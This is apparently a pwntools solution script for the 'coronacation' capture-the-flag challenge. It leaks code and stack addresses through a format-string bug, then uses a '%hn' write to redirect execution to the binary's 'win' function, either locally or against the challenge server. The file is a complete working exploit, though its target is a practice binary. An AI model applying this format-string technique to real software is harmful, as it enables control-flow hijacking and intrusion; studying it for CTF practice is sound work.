from pwn import *

e = ELF("./coronacation")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("ctf.umbccd.io", 4300)
else:
  p = process(e.path)



p.sendlineafter("2.", "1;%9$llx;%14$llx;")
p.recvuntil(";")

leak = int(p.recvuntil(";", drop=True), 16) - 0x5626abbe84d5 + 0x00005626abbe7000
stk = int(p.recvuntil(";", drop=True), 16) - 0x5626abbe84d5 + 0x00005626abbe7000 - 0x7fff64e2c41b + 0x7fff64e2d898

print(hex(leak))
print(hex(stk))

goal = leak + e.symbols["win"]
bl = 0x10000

print(hex(goal))

p.sendlineafter("2.", ("1%" + str(goal % bl - 1) + "x%8$hn").ljust(0x10, "\x00") + p64(stk))



p.interactive()
